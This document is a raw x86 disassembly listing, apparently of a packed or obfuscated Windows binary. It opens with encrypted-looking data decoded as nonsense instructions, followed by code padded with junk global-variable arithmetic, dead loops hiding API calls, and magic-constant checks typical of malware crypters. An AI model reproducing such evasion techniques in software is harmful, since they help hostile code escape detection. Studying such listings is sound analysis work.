  4204ca:	add    eax,0xb69b3cb3
  4204cf:	ja     0x420458
  4204d1:	dec    edi
  4204d2:	repz inc esi
  4204d4:	arpl   dx,bx
  4204d6:	add    dl,BYTE PTR [edx+0x76]
  4204d9:	movaps XMMWORD PTR [ebx+0x1c88751e],xmm0
  4204e0:	into   
  4204e1:	out    0x26,eax
  4204e3:	mov    ah,0x94
  4204e5:	inc    ebp
  4204e6:	ins    BYTE PTR es:[edi],dx
  4204e7:	sbb    DWORD PTR [esi+0x24c476bf],ebp
  4204ed:	mov    ah,0xb9
  4204ef:	call   0xc1c8ce2
  4204f4:	push   ss
  4204f5:	sahf   
  4204f6:	jg     0x420531
  4204f8:	fstp   QWORD PTR [ecx+0x45a8dc9d]
  4204fe:	cmc    
  4204ff:	pop    ds
  420500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420501:	pop    ebp
  420502:	stos   BYTE PTR es:[edi],al
  420503:	pusha  
  420504:	jp     0x420530
  420506:	dec    esp
  420507:	test   al,0x3c
  420509:	cmovno edi,DWORD PTR [esi+0x10]
  42050d:	dec    edx
  42050e:	inc    edi
  42050f:	cld    
  420510:	adc    ebx,DWORD PTR [edx+0x530c5989]
  420516:	ins    DWORD PTR es:[edi],dx
  420517:	mov    cl,0x67
  420519:	bnd jne 0x4204ef
  42051c:	pushf  
  42051d:	out    dx,eax
  42051e:	aam    0x76
  420520:	adc    edx,DWORD PTR [edi+0x787a9600]
  420526:	push   0x4e
  420528:	jmp    0xd8bc:0x70136a4b
  42052f:	into   
  420530:	bound  esi,QWORD PTR [edx]
  420532:	dec    ecx
  420533:	in     al,0xb2
  420535:	sbb    al,BYTE PTR [edi-0x5f950193]
  42053b:	dec    ecx
  42053c:	xchg   edi,eax
  42053d:	add    DWORD PTR [eax+edx*8-0x5aa642b1],eax
  420544:	dec    ebp
  420545:	dec    ecx
  420546:	iret   
  420547:	fdivr  QWORD PTR [edi]
  420549:	adc    eax,0x2412b9a0
  42054e:	hlt    
  42054f:	ins    BYTE PTR es:[edi],dx
  420550:	(bad)  
  420552:	mov    WORD PTR [edi-0x7f],es
  420555:	fs dec esp
  420557:	xor    ch,BYTE PTR [eax+ecx*8]
  42055a:	(bad)  
  42055b:	call   0x75cb3c31
  420560:	mov    eax,ds:0x6655e572
  420565:	lds    esp,FWORD PTR [esi-0x5e]
  420568:	es ss push ebp
  42056b:	(bad)  
  42056c:	sub    bh,bh
  42056e:	lock ret 
  420570:	mov    ss,WORD PTR [edi+0x12f23d8a]
  420576:	data16 jg 0x4205df
  420579:	stos   DWORD PTR es:[edi],eax
  42057a:	daa    
  42057b:	idiv   DWORD PTR [ebp+0x5c]
  42057e:	mov    esi,0xc8d98a92
  420583:	popf   
  420584:	xor    al,0xa2
  420586:	rcl    BYTE PTR [edx+0x309ecaf6],0xc1
  42058d:	rol    eax,cl
  42058f:	inc    ebx
  420590:	daa    
  420591:	pop    ecx
  420592:	jp     0x4205d0
  420594:	shl    BYTE PTR [edi+0xa],0x7
  420598:	into   
  420599:	fldcw  WORD PTR [ebx-0x2e]
  42059c:	cs in  eax,dx
  42059e:	popa   
  42059f:	mov    bh,0x94
  4205a1:	and    al,0x93
  4205a3:	in     eax,0xf5
  4205a5:	gs mov dh,0x62
  4205a8:	adc    DWORD PTR [esi+esi*8],0xffffffae
  4205ac:	mov    bh,0xb6
  4205ae:	sub    BYTE PTR [ebx],0xf9
  4205b1:	ss add eax,0x29ce9f98
  4205b7:	jp     0x42062e
  4205b9:	or     dh,dh
  4205bb:	xchg   edx,eax
  4205bc:	dec    edx
  4205bd:	lock sbb DWORD PTR [eax-0x77ac81ea],ebp
  4205c4:	test   cl,cl
  4205c6:	mov    gs,WORD PTR [ebp-0x685d2404]
  4205cc:	jae    0x4205c5
  4205ce:	(bad)  
  4205cf:	mov    ah,0xbf
  4205d1:	jb     0x4205b8
  4205d3:	daa    
  4205d4:	or     bl,BYTE PTR [edx+0x22489a4]
  4205da:	out    0x38,al
  4205dc:	adc    BYTE PTR ss:[esi],0x94
  4205e0:	and    al,0x21
  4205e2:	(bad)  
  4205e4:	mov    cl,0xa8
  4205e6:	(bad)  
  4205e7:	aam    0x1c
  4205e9:	jnp    0x4205e6
  4205eb:	xchg   ebp,eax
  4205ec:	scas   al,BYTE PTR es:[edi]
  4205ed:	cli    
  4205ee:	cmp    esi,DWORD PTR [edi]
  4205f0:	mov    ebp,0x575c6106
  4205f5:	bound  edi,QWORD PTR [esi]
  4205f7:	or     al,0xb6
  4205f9:	xor    esi,DWORD PTR [eax]
  4205fb:	mov    ebx,0x15d4d63a
  420600:	and    al,0xfe
  420602:	xchg   edi,eax
  420603:	add    ah,0xe5
  420606:	jns    0x4205d6
  420608:	je     0x4205e2
  42060a:	mov    ebp,esi
  42060c:	mov    eax,ds:0x1eacaf05
  420611:	(bad)  
  420612:	dec    esp
  420613:	(bad)  
  420615:	mov    ebp,0xb8dea04d
  42061a:	add    cl,BYTE PTR [esi+0x5e]
  42061d:	popa   
  42061e:	and    BYTE PTR [ecx+0x6a75fe8b],bl
  420624:	gs stos BYTE PTR es:[edi],al
  420626:	mov    WORD PTR [eax],ds
  420628:	mov    ch,0xb9
  42062a:	cld    
  42062b:	and    DWORD PTR [eax],ebp
  42062d:	mov    bh,0x7d
  42062f:	scas   eax,DWORD PTR es:[edi]
  420630:	jg     0x4205e9
  420632:	add    bh,BYTE PTR [edx-0x77]
  420635:	or     cl,BYTE PTR [ebx+0x7a]
  420638:	inc    edi
  420639:	xor    al,0xd6
  42063b:	jne    0x42064f
  42063d:	fsub   st,st(6)
  42063f:	push   0x5f8fc84e
  420644:	add    eax,0x5b46b7f
  420649:	xchg   ebx,eax
  42064a:	and    BYTE PTR [ebx+0x43],ch
  42064d:	addr16 jae 0x420644
  420650:	mov    ds:0xf4cbb3ae,al
  420655:	cld    
  420656:	test   al,0xbe
  420658:	das    
  420659:	inc    ax
  42065b:	fadd   st(7),st
  42065d:	test   al,0x7
  42065f:	cli    
  420660:	sahf   
  420661:	in     eax,dx
  420662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420663:	sub    eax,0xaabdb64a
  420668:	xchg   ecx,eax
  420669:	push   ebp
  42066a:	fld    TBYTE PTR [edi+edx*4]
  42066d:	push   0xffffffe3
  42066f:	push   edx
  420670:	push   ds
  420671:	sbb    edx,edi
  420673:	pop    edx
  420674:	in     eax,dx
  420675:	mov    ah,BYTE PTR [esi-0x16]
  420678:	adc    ebx,DWORD PTR [ebx]
  42067a:	call   0x6c9d8d56
  42067f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420681:	icebp  
  420682:	call   0x318c4d5d
  420687:	dec    esi
  420688:	stos   DWORD PTR es:[edi],eax
  420689:	or     DWORD PTR ds:0xd9e0cda1,esi
  42068f:	iret   
  420690:	push   cs
  420691:	lods   eax,DWORD PTR ds:[esi]
  420692:	sub    esi,edi
  420694:	jno    0x4206f2
  420696:	clc    
  420697:	xor    BYTE PTR [esp+edi*8+0x3a],bl
  42069b:	jbe    0x42069c
  42069d:	not    DWORD PTR [ecx+0x6b]
  4206a0:	outs   dx,DWORD PTR ds:[esi]
  4206a1:	dec    ecx
  4206a2:	mov    esi,0x26161f22
  4206a7:	loopne 0x4206df
  4206a9:	(bad)  
  4206aa:	cwde   
  4206ab:	repnz dec esi
  4206ad:	sahf   
  4206ae:	adc    DWORD PTR [eax],eax
  4206b0:	pop    ecx
  4206b1:	and    dh,BYTE PTR [edi+0x7d]
  4206b4:	cmp    eax,ebx
  4206b6:	(bad)  
  4206b7:	mov    eax,DWORD PTR [ebx]
  4206b9:	pop    es
  4206ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206bb:	in     eax,dx
  4206bc:	mov    eax,0x9a1a4050
  4206c1:	push   es
  4206c2:	enter  0x73c9,0xcf
  4206c6:	int    0xde
  4206c8:	aaa    
  4206c9:	inc    esp
  4206cb:	(bad)  
  4206cc:	call   0xdff9:0x92fa11e2
  4206d3:	adc    ebp,DWORD PTR [ecx]
  4206d5:	mov    eax,ds:0x78ad9ceb
  4206da:	inc    eax
  4206db:	jae    0x420685
  4206dd:	call   0x8254:0xc82bc1c0
  4206e4:	stos   BYTE PTR es:[edi],al
  4206e5:	sbb    DWORD PTR [esi-0x7a],edi
  4206e8:	and    DWORD PTR [ebp-0x70],0xffffffad
  4206ec:	cmp    al,0x59
  4206ee:	mov    cl,0xaa
  4206f0:	retf   
  4206f1:	leave  
  4206f2:	iret   
  4206f3:	rcl    BYTE PTR [ebx-0x5d],0x94
  4206f7:	fs ds std 
  4206fa:	pop    ebx
  4206fb:	push   ecx
  4206fc:	xchg   ecx,eax
  4206fd:	retf   0x718
  420700:	inc    esi
  420701:	cmp    al,0x1a
  420703:	fld    DWORD PTR [edx+0x34]
  420706:	into   
  420707:	add    eax,0xaeba7128
  42070c:	sbb    ebp,esi
  42070e:	repz jo 0x42073f
  420711:	inc    eax
  420712:	call   DWORD PTR [esi]
  420714:	mov    bl,0x8
  420716:	cli    
  420717:	adc    al,0xb4
  420719:	sub    al,0xc7
  42071b:	lds    ecx,FWORD PTR [ebx-0x13]
  42071e:	dec    ecx
  42071f:	mov    ebp,0x624c5b1d
  420724:	pop    ds
  420725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420726:	sub    bl,BYTE PTR ds:[edi]
  420729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42072a:	mov    es,eax
  42072c:	aam    0x1
  42072e:	into   
  42072f:	sahf   
  420730:	aad    0x9d
  420732:	inc    edx
  420733:	ds jne 0x4206ef
  420736:	aad    0xed
  420738:	mov    ecx,eax
  42073a:	xor    cl,ch
  42073c:	jg     0x420702
  42073e:	aam    0xa8
  420740:	sub    eax,0x6d19ac2e
  420745:	xchg   ecx,eax
  420746:	aam    0xe2
  420748:	jmp    0x420797
  42074a:	xchg   DWORD PTR [edi+0x74216294],esi
  420750:	mov    esi,0x5349f3bf
  420755:	cmp    BYTE PTR [ebx-0x280e99f1],ch
  42075b:	sbb    eax,0xb1278cc3
  420760:	adc    ecx,ebx
  420762:	push   0x863f0ff2
  420767:	mov    esp,0xaf9eec30
  42076c:	cmp    al,0xb7
  42076e:	sbb    al,0x47
  420770:	sub    bl,BYTE PTR [ebp-0x7ca547f1]
  420776:	sbb    DWORD PTR [eax+0x58],esp
  420779:	ins    BYTE PTR es:[edi],dx
  42077a:	fadd   st,st(1)
  42077d:	mov    WORD PTR [ecx],gs
  42077f:	sbb    BYTE PTR [eax-0x2768942d],bh
  420785:	clc    
  420786:	fisttp WORD PTR [ecx+0x5e]
  420789:	(bad)  
  42078a:	or     bl,ch
  42078c:	int3   
  42078d:	inc    ebp
  42078e:	and    al,0x86
  420790:	loope  0x420795
  420792:	ror    DWORD PTR [ecx+0x458bec45],0xec
  420799:	mov    eax,DWORD PTR [eax+0xc]
  42079c:	movsx  eax,BYTE PTR [eax+ecx*1]
  4207a0:	cdq    
  4207a1:	add    eax,ebx
  4207a3:	adc    edx,0xffffffff
  4207a6:	xor    eax,edi
  4207a8:	xor    edx,0x0
  4207ab:	cmp    eax,0x70941e1e
  4207b0:	jne    0x41e3c0
  4207b6:	cmp    edx,0xffffffff
  4207b9:	jne    0x41e3c0
  4207bf:	mov    eax,ds:0x42830b
  4207c4:	mov    eax,DWORD PTR [eax+0x198]
  4207ca:	mov    DWORD PTR [eax],ecx
  4207cc:	mov    eax,ecx
  4207ce:	jmp    0x4207f7
  4207d3:	mov    eax,DWORD PTR [ebp+0x18]
  4207d6:	cmp    eax,0xf89c85a2
  4207db:	jne    0x4207f7
  4207e1:	push   0xf89c85a3
  4207e6:	push   DWORD PTR [ebp+0x14]
  4207e9:	push   DWORD PTR [ebp+0x10]
  4207ec:	push   DWORD PTR [ebp+0xc]
  4207ef:	push   DWORD PTR [ebp+0x8]
  4207f2:	call   0x41b9fd
  4207f7:	pop    edi
  4207f8:	pop    ebx
  4207f9:	pop    esi
  4207fa:	leave  
  4207fb:	ret    0x14
  4207fe:	push   ebp
  4207ff:	mov    ebp,esp
  420801:	and    esp,0xfffffff8
  420804:	or     DWORD PTR ds:0x42918f,0x225c
  42080e:	sub    esp,0x3fc
  420814:	sbb    DWORD PTR ds:0x4291a7,0x4291f3
  42081e:	push   ebx
  42081f:	push   esi
  420820:	push   edi
  420821:	and    DWORD PTR ds:0x42915f,0x397e
  42082b:	push   0x42842f
  420830:	or     DWORD PTR ds:0x4291af,0x2ff8
  42083a:	push   0x7876867
  42083f:	or     DWORD PTR ds:0x4291b7,0x20a1
  420849:	call   DWORD PTR ds:0x42a78b
  42084f:	sub    DWORD PTR ds:0x42915f,0x5681
  420859:	mov    DWORD PTR [esp+0x30],eax
  42085d:	lea    eax,[esp+0x78]
  420861:	push   eax
  420862:	sub    DWORD PTR ds:0x42919b,0x4291d3
  42086c:	push   0x428447
  420871:	mov    DWORD PTR ds:0x4291e3,0x3a46
  42087b:	call   DWORD PTR ds:0x42a7ab
  420881:	cmp    eax,0xffffffff
  420884:	je     0x42089b
  42088a:	xor    DWORD PTR ds:0x42915f,0x150a
  420894:	xor    eax,eax
  420896:	jmp    0x421b36
  42089b:	mov    esi,DWORD PTR ds:0x42a7c7
  4208a1:	xor    DWORD PTR ds:0x4291d3,0x3930
  4208ab:	push   0xf
  4208ad:	lea    eax,[esp+0x44]
  4208b1:	push   eax
  4208b2:	push   0x42845b
  4208b7:	push   0x42846f
  4208bc:	sub    DWORD PTR ds:0x42915f,0x4291d7
  4208c6:	push   0x42848f
  4208cb:	adc    DWORD PTR ds:0x429183,0x3c8a
  4208d5:	call   esi
  4208d7:	imul   eax,eax,0x300000
  4208dd:	cmp    eax,0x1b00000
  4208e2:	mov    DWORD PTR ds:0x4291bf,0x78b4
  4208ec:	jne    0x42088a
  4208f2:	or     DWORD PTR ds:0x4291b3,0x42915b
  4208fc:	lea    eax,[esp+0x1b8]
  420903:	and    DWORD PTR ds:0x42919f,0x5d3c
  42090d:	push   eax
  42090e:	add    DWORD PTR ds:0x4291e3,0x4291af
  420918:	push   0x4284cb
  42091d:	and    DWORD PTR ds:0x429153,0x42915b
  420927:	call   DWORD PTR ds:0x42a797
  42092d:	cmp    eax,0xffffffff
  420930:	jne    0x42088a
  420936:	add    DWORD PTR ds:0x42914b,0x6e9d
  420940:	mov    DWORD PTR [esp+0x30],0x0
  420948:	or     ecx,ecx
  42094a:	mov    ecx,0xf89c85a1
  42094f:	mov    DWORD PTR ds:0x4291af,0x17
  420959:	cmp    DWORD PTR ds:0x4291af,0x0
  420960:	je     0x4209b6
  420966:	cmp    DWORD PTR ds:0x4291af,0x4
  42096d:	jge    0x4209b6
  420973:	jmp    0x420988
  420978:	push   0x4280d6
  42097d:	push   0x1
  42097f:	push   DWORD PTR [ebp-0x24]
  420982:	call   DWORD PTR ds:0x42a7af
  420988:	cmp    DWORD PTR ds:0x4291af,0x5
  42098f:	jne    0x4209a2
  420995:	mov    ebx,DWORD PTR ds:0x4291af
  42099b:	dec    ebx
  42099c:	mov    DWORD PTR ds:0x4291af,ebx
  4209a2:	xor    ebx,ebx
  4209a4:	xor    ebx,DWORD PTR ds:0x4291af
  4209aa:	dec    ebx
  4209ab:	mov    DWORD PTR ds:0x4291af,ebx
  4209b1:	jmp    0x420959
  4209b6:	mov    DWORD PTR [esp+0x18],ecx
  4209ba:	add    DWORD PTR ds:0x429167,0x3918
  4209c4:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  4209cc:	mov    edx,DWORD PTR ds:0x4291af
  4209d2:	or     DWORD PTR ds:0x429163,edx
  4209d8:	lea    eax,[esp+0x3c]
  4209dc:	mov    DWORD PTR [esp+0x30],eax
  4209e0:	xor    edi,edx
  4209e2:	lea    eax,[esp+0x38]
  4209e6:	sbb    edx,DWORD PTR ds:0x4291c3
  4209ec:	mov    DWORD PTR [esp+0x20],eax
  4209f0:	or     edi,0x5972
  4209f6:	mov    eax,ds:0x42830b
  4209fb:	mov    DWORD PTR ds:0x42917f,0x17
  420a05:	cmp    DWORD PTR ds:0x42917f,0x0
  420a0c:	je     0x420a43
  420a12:	cmp    DWORD PTR ds:0x42917f,0x21
  420a19:	jl     0x420a43
  420a1f:	jmp    0x420a2f
  420a24:	push   0x3972
  420a29:	call   DWORD PTR ds:0x42a7b3
  420a2f:	xor    edi,edi
  420a31:	add    edi,DWORD PTR ds:0x42917f
  420a37:	dec    edi
  420a38:	mov    DWORD PTR ds:0x42917f,edi
  420a3e:	jmp    0x420a05
  420a43:	mov    eax,DWORD PTR [eax+0x1c8]
  420a49:	mov    eax,DWORD PTR [eax]
  420a4b:	mov    edx,DWORD PTR [esp+0x20]
  420a4f:	mov    edi,0x75108ac
  420a54:	mov    ebx,DWORD PTR ds:0x4291db
  420a5a:	sbb    DWORD PTR ds:0x429153,ebx
  420a60:	xor    eax,edi
  420a62:	adc    DWORD PTR ds:0x4291f3,0x37f0
  420a6c:	mov    ebx,0x3272f3
  420a71:	add    DWORD PTR ds:0x4291a3,0x4291a7
  420a7b:	add    eax,ebx
  420a7d:	not    DWORD PTR ds:0x4291a3
  420a83:	mov    DWORD PTR [edx],eax
  420a85:	mov    DWORD PTR ds:0x4291cb,0x5252
  420a8f:	mov    eax,ds:0x42901f
  420a94:	cmp    eax,0x445cecf9
  420a99:	mov    DWORD PTR ds:0x4291bb,0x4b3f
  420aa3:	jne    0x420b94
  420aa9:	mov    eax,DWORD PTR [esp+0x18]
  420aad:	and    DWORD PTR ds:0x4291ab,0x0
  420ab7:	jmp    0x420acb
  420abc:	xor    edx,edx
  420abe:	add    edx,DWORD PTR ds:0x4291ab
  420ac4:	inc    edx
  420ac5:	mov    DWORD PTR ds:0x4291ab,edx
  420acb:	cmp    DWORD PTR ds:0x4291ab,0x1e
  420ad2:	jae    0x420b1c
  420ad8:	cmp    DWORD PTR ds:0x4291ab,0xe
  420adf:	jl     0x420b1c
  420ae5:	jmp    0x420afd
  420aea:	push   0x4280a5
  420aef:	push   DWORD PTR [ebp-0x1c]
  420af2:	push   0x3b7d
  420af7:	call   DWORD PTR ds:0x42a7b7
  420afd:	cmp    DWORD PTR ds:0x4291ab,0xd
  420b04:	jne    0x420b17
  420b0a:	mov    edx,DWORD PTR ds:0x4291ab
  420b10:	inc    edx
  420b11:	mov    DWORD PTR ds:0x4291ab,edx
  420b17:	jmp    0x420abc
  420b1c:	mov    edx,DWORD PTR ds:0x42830b
  420b22:	adc    DWORD PTR ds:0x4291b3,0x4291a7
  420b2c:	mov    edx,DWORD PTR [edx+0x198]
  420b32:	adc    DWORD PTR ds:0x4291a3,0x42918f
  420b3c:	xor    eax,edi
  420b3e:	sub    DWORD PTR ds:0x42916f,0x429197
  420b48:	add    eax,ebx
  420b4a:	add    DWORD PTR ds:0x42915f,0x42915b
  420b54:	mov    DWORD PTR [edx],eax
  420b56:	mov    eax,DWORD PTR [esp+0x18]
  420b5a:	xor    eax,edi
  420b5c:	not    DWORD PTR ds:0x4291b3
  420b62:	add    eax,ebx
  420b64:	sbb    DWORD PTR ds:0x4291eb,0x4291d3
  420b6e:	mov    ds:0x42901f,eax
  420b73:	mov    eax,DWORD PTR [esp+0x18]
  420b77:	sbb    DWORD PTR ds:0x42917b,0x42915f
  420b81:	xor    eax,edi
  420b83:	sub    DWORD PTR ds:0x429167,0x5dcc
  420b8d:	add    eax,ebx
  420b8f:	mov    ds:0x428403,eax
  420b94:	and    DWORD PTR ds:0x4291c3,0x0
  420b9e:	xor    eax,eax
  420ba0:	xor    eax,DWORD PTR ds:0x4291c3
  420ba6:	inc    eax
  420ba7:	mov    ds:0x4291c3,eax
  420bac:	cmp    DWORD PTR ds:0x4291c3,0x10
  420bb3:	jb     0x420be9
  420bb9:	jmp    0x420bc4
  420bbe:	call   DWORD PTR ds:0x42a7bb
  420bc4:	cmp    DWORD PTR ds:0x4291c3,0xf
  420bcb:	jne    0x420bdc
  420bd1:	mov    eax,ds:0x4291c3
  420bd6:	inc    eax
  420bd7:	mov    ds:0x4291c3,eax
  420bdc:	cmp    DWORD PTR ds:0x4291c3,0x1a
  420be3:	jb     0x420b9e
  420be9:	mov    eax,ds:0x42830b
  420bee:	xor    DWORD PTR ds:0x4291bb,0x4291bf
  420bf8:	mov    eax,DWORD PTR [eax+0x18c]
  420bfe:	add    DWORD PTR ds:0x4291e7,0x4bf9
  420c08:	mov    eax,DWORD PTR [eax]
  420c0a:	mov    DWORD PTR [esp+0x60],eax
  420c0e:	mov    eax,0xf89c85bd
  420c13:	mov    DWORD PTR [esp+0x10],eax
  420c17:	add    DWORD PTR ds:0x429193,0x4291c7
  420c21:	mov    DWORD PTR [esp+0x10],eax
  420c25:	or     DWORD PTR ds:0x42917f,0x429187
  420c2f:	mov    DWORD PTR [esp+0x10],eax
  420c33:	mov    DWORD PTR [esp+0x10],ecx
  420c37:	dec    DWORD PTR ds:0x429167
  420c3d:	mov    DWORD PTR [esp+0x20],eax
  420c41:	and    DWORD PTR ds:0x4291d7,0x0
  420c4b:	xor    eax,eax
  420c4d:	add    eax,DWORD PTR ds:0x4291d7
  420c53:	inc    eax
  420c54:	mov    ds:0x4291d7,eax
  420c59:	cmp    DWORD PTR ds:0x4291d7,0xc
  420c60:	jge    0x420ca3
  420c66:	jmp    0x420c7b
  420c6b:	push   0x4291a7
  420c70:	push   0x4280a5
  420c75:	call   DWORD PTR ds:0x42a7bf
  420c7b:	cmp    DWORD PTR ds:0x4291d7,0xb
  420c82:	jne    0x420c96
  420c88:	xor    eax,eax
  420c8a:	xor    eax,DWORD PTR ds:0x4291d7
  420c90:	inc    eax
  420c91:	mov    ds:0x4291d7,eax
  420c96:	cmp    DWORD PTR ds:0x4291d7,0x18
  420c9d:	jb     0x420c4b
  420ca3:	mov    DWORD PTR [esp+0x20],0xf89c85b9
  420cab:	sbb    eax,0x733e
  420cb0:	mov    eax,DWORD PTR [esp+0x18]
  420cb4:	xor    eax,edi
  420cb6:	xor    DWORD PTR ds:0x429167,0x2364
  420cc0:	add    eax,ebx
  420cc2:	jmp    0x420ea1
  420cc7:	lea    eax,[esp+0x78]
  420ccb:	sub    DWORD PTR ds:0x42918f,0x2bd1
  420cd5:	push   eax
  420cd6:	add    DWORD PTR ds:0x4291af,0x4291bb
  420ce0:	push   0x4284b7
  420ce5:	add    DWORD PTR ds:0x42916f,0x62a2
  420cef:	call   DWORD PTR ds:0x42a7ab
  420cf5:	mov    DWORD PTR ds:0x4291ef,0x479f
  420cff:	cmp    eax,0xffffffff
  420d02:	jne    0x42088a
  420d08:	push   0xf
  420d0a:	lea    eax,[esp+0x44]
  420d0e:	add    DWORD PTR ds:0x42918f,0x71aa
  420d18:	push   eax
  420d19:	adc    DWORD PTR ds:0x4291bb,0x429187
  420d23:	push   0x42850b
  420d28:	push   0x42851f
  420d2d:	or     DWORD PTR ds:0x4291ef,0x259a
  420d37:	push   0x42853f
  420d3c:	call   esi
  420d3e:	imul   eax,eax,0x300000
  420d44:	mov    DWORD PTR ds:0x42914f,0x7610
  420d4e:	cmp    eax,0x1b00000
  420d53:	mov    DWORD PTR ds:0x429157,0x1024
  420d5d:	jne    0x42088a
  420d63:	sbb    DWORD PTR ds:0x4291c3,0x4291d7
  420d6d:	lea    eax,[esp+0x1b8]
  420d74:	push   eax
  420d75:	push   0x42857b
  420d7a:	sbb    DWORD PTR ds:0x42918f,0x1a84
  420d84:	call   DWORD PTR ds:0x42a797
  420d8a:	mov    DWORD PTR ds:0x4291b3,0x1d41
  420d94:	cmp    eax,0xffffffff
  420d97:	jne    0x42088a
  420d9d:	mov    eax,DWORD PTR [esp+0xc]
  420da1:	xor    ecx,DWORD PTR ds:0x42914f
  420da7:	mov    ecx,DWORD PTR [esp+0x20]
  420dab:	sbb    DWORD PTR ds:0x429197,0x5641
  420db5:	xor    eax,edi
  420db7:	sbb    DWORD PTR ds:0x4291ef,0x4291eb
  420dc1:	lea    eax,[eax+ecx*1+0x3272f3]
  420dc8:	inc    DWORD PTR ds:0x4291e7
  420dce:	push   eax
  420dcf:	add    DWORD PTR ds:0x4291b3,ebx
  420dd5:	mov    eax,DWORD PTR [esp+0x14]
  420dd9:	xor    eax,edi
  420ddb:	lea    eax,[ebp+eax*1+0x3272fb]
  420de2:	xor    DWORD PTR ds:0x429197,0x3901
  420dec:	push   eax
  420ded:	mov    DWORD PTR ds:0x429153,0x5a0a
  420df7:	mov    eax,ds:0x42830b
  420dfc:	xor    DWORD PTR ds:0x4291c3,0x2a62
  420e06:	push   DWORD PTR [eax+0x1bc]
  420e0c:	adc    DWORD PTR ds:0x429153,0x42915f
  420e16:	call   0x421b3f
  420e1b:	and    DWORD PTR ds:0x4291af,0x0
  420e25:	jmp    0x420e37
  420e2a:	mov    edx,DWORD PTR ds:0x4291af
  420e30:	inc    edx
  420e31:	mov    DWORD PTR ds:0x4291af,edx
  420e37:	cmp    DWORD PTR ds:0x4291af,0x15
  420e3e:	jae    0x420e7e
  420e44:	cmp    DWORD PTR ds:0x4291af,0xd
  420e4b:	jl     0x420e7e
  420e51:	jmp    0x420e5f
  420e56:	push   DWORD PTR [ebp-0x1c]
  420e59:	call   DWORD PTR ds:0x42a7c3
  420e5f:	cmp    DWORD PTR ds:0x4291af,0xc
  420e66:	jne    0x420e79
  420e6c:	mov    edx,DWORD PTR ds:0x4291af
  420e72:	inc    edx
  420e73:	mov    DWORD PTR ds:0x4291af,edx
  420e79:	jmp    0x420e2a
  420e7e:	mov    eax,DWORD PTR [esp+0xc]
  420e82:	mov    ecx,DWORD PTR [esp+0x20]
  420e86:	mov    edx,DWORD PTR ds:0x429167
  420e8c:	adc    DWORD PTR ds:0x4291b3,edx
  420e92:	xor    eax,edi
  420e94:	and    edx,DWORD PTR ds:0x4291b3
  420e9a:	lea    eax,[ecx+eax*1+0x3272f3]
  420ea1:	mov    ecx,DWORD PTR [esp+0xc]
  420ea5:	neg    edx
  420ea7:	mov    edx,DWORD PTR [esp+0xc]
  420eab:	or     DWORD PTR ds:0x42917b,0x429157
  420eb5:	xor    edx,edi
  420eb7:	or     DWORD PTR ds:0x4291c7,0x1707
  420ec1:	xor    ecx,edi
  420ec3:	xor    DWORD PTR ds:0x42916f,0x6f67
  420ecd:	add    ecx,edx
  420ecf:	mov    edx,DWORD PTR [esp+0xc]
  420ed3:	add    DWORD PTR ds:0x429193,0xde7
  420edd:	xor    edx,edi
  420edf:	mov    DWORD PTR ds:0x429197,0x79ec
  420ee9:	lea    ecx,[ecx+edx*1+0x9758d9]
  420ef0:	mov    DWORD PTR ds:0x42917b,0x463d
  420efa:	mov    DWORD PTR [esp+0x20],eax
  420efe:	cmp    eax,ecx
  420f00:	jbe    0x420cc7
  420f06:	xor    ecx,ecx
  420f08:	or     ecx,DWORD PTR ds:0x4291a3
  420f0e:	or     DWORD PTR ds:0x4291b3,ecx
  420f14:	mov    eax,DWORD PTR [ebp+0xc]
  420f17:	and    DWORD PTR ds:0x4291e3,0x0
  420f21:	mov    ecx,DWORD PTR ds:0x4291e3
  420f27:	inc    ecx
  420f28:	mov    DWORD PTR ds:0x4291e3,ecx
  420f2e:	cmp    DWORD PTR ds:0x4291e3,0x18
  420f35:	jge    0x420f62
  420f3b:	jmp    0x420f55
  420f40:	push   0x4291ab
  420f45:	push   0x4291db
  420f4a:	push   0x4566
  420f4f:	call   DWORD PTR ds:0x42a7cb
  420f55:	cmp    DWORD PTR ds:0x4291e3,0x17
  420f5c:	jb     0x420f21
  420f62:	mov    ds:0x42818f,eax
  420f67:	mov    eax,DWORD PTR [ebp+0x10]
  420f6a:	mov    ds:0x4283eb,eax
  420f6f:	mov    DWORD PTR ds:0x4291af,0x18
  420f79:	cmp    DWORD PTR ds:0x4291af,0x0
  420f80:	je     0x420fd1
  420f86:	cmp    DWORD PTR ds:0x4291af,0x4
  420f8d:	ja     0x420fd1
  420f93:	jmp    0x420fa3
  420f98:	push   0x82c1
  420f9d:	call   DWORD PTR ds:0x42a793
  420fa3:	cmp    DWORD PTR ds:0x4291af,0x5
  420faa:	jne    0x420fbf
  420fb0:	xor    ecx,ecx
  420fb2:	or     ecx,DWORD PTR ds:0x4291af
  420fb8:	dec    ecx
  420fb9:	mov    DWORD PTR ds:0x4291af,ecx
  420fbf:	mov    ecx,DWORD PTR ds:0x4291af
  420fc5:	dec    ecx
  420fc6:	mov    DWORD PTR ds:0x4291af,ecx
  420fcc:	jmp    0x420f79
  420fd1:	mov    eax,ds:0x42818f
  420fd6:	movzx  ecx,BYTE PTR ds:0x429183
  420fdd:	adc    DWORD PTR ds:0x4291d7,ecx
  420fe3:	mov    ecx,DWORD PTR [esp+0x30]
  420fe7:	sub    DWORD PTR ds:0x4291ab,0x2768
  420ff1:	sub    eax,ebx
  420ff3:	and    DWORD PTR ds:0x42919f,0x51d9
  420ffd:	xor    eax,edi
  420fff:	mov    DWORD PTR [ecx],eax
  421001:	lea    eax,[esp+0x2c]
  421005:	mov    DWORD PTR [esp+0x6c],eax
  421009:	xor    DWORD PTR ds:0x4291cf,0x6aa
  421013:	lea    eax,[ebp+0x4]
  421016:	sub    DWORD PTR ds:0x42915b,0x4291af
  421020:	mov    DWORD PTR [esp+0x2c],eax
  421024:	lea    eax,[esp+0x78]
  421028:	sub    DWORD PTR ds:0x429153,0x6538
  421032:	push   eax
  421033:	add    DWORD PTR ds:0x4291a3,0x4291f3
  42103d:	push   0x428567
  421042:	call   DWORD PTR ds:0x42a7ab
  421048:	mov    DWORD PTR ds:0x4291e3,0x1cd6
  421052:	cmp    eax,0xffffffff
  421055:	mov    DWORD PTR ds:0x4291b7,0x32c8
